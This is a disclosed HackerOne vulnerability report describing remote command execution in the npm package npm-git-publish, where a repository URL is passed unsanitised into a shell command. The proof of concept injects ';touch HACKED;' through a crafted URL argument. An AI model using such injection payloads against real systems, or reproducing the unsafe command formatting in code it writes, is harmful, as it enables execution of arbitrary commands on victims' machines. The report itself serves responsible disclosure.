# [M] [npm-git-publish] RCE via insecure command formatting

## Summary
Severity: Medium (CVSS 6.8)
Program: Node.js third-party modules
Weakness: Code Injection
Reporter: mik317
State: resolved
Disclosed: 2020-01-11T12:08:21.335Z
Source: https://hackerone.com/reports/730121

## Details
I would like to report a `RCE` issue in the `npm-git-publish` module.
It allows to execute `arbitrary commands remotely inside the victim's PC`

# Module
**module name:** `npm-git-publish`
**version:** `0.2.4-beta`
**npm page:** `https://www.npmjs.com/package/npm-git-publish`

## Module Description
> Share/publish private packages using Git remotes!

## Module Stats
[~70] downloads in the last day
[268] downloads in the last week
[~1k] downloads in the last month

## Vulnerability Description
The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check. The issue arises here: https://github.com/theoy/npm-git-publish/blob/master/lib/publish.ts#L151

## Steps To Reproduce:
1. Create the following PoC file:

```js
// poc.js
var git = require('npm-git-publish');
git.publish('.', 'http://gihub.com ;touch HACKED; #')

```
1. Check there aren't files called `HACKED` 
1. Execute the following commands in another terminal:

```bash
npm i npm-git-publish # Install affected module
node poc.js #  Run the PoC
```
1. Recheck the files: now `HACKED` has been created :) {F626780}

## Patch

_Trimmed to 38 lines — full report: https://hackerone.com/reports/730121_
